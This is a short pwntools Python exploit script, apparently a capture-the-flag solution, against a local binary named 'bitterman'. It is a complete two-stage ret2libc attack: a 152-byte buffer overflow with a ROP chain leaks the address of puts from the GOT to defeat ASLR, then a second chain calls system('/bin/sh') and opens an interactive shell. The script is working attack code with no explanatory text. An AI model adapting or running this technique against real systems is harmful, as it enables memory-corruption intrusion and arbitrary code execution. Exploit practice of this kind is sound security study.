from pwn import *

context(terminal=['tmux','new-window'])
p = process('./bitterman')
#p = gdb.debug('./bitterman','b main')

context(os="linux", arch="amd64")
#context.log_level = 'DEBUG'

log.info("Mapping binaries")
bitterman = ELF('bitterman')
rop = ROP(bitterman)
libc = ELF('libc.so.6')

junk = "A"*152

rop.search(regs=['rdi'], order = 'regs')
rop.puts(bitterman.got['puts'])
rop.call(bitterman.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())

#raw_input()


payload = junk + str(rop)

p.recvuntil("name?")
p.sendline("shell5")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")
leaked_puts = p.recv()[:8].strip().ljust(8,"\x00")
log.success("Leaked puts@GLIBCL: " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

# Stage 2
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 ROP CHAIN:\n" + rop2.dump())

payload = junk + str(rop2)

#p.recvuntil("name?")
p.sendline("shell8")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")

p.interactive()
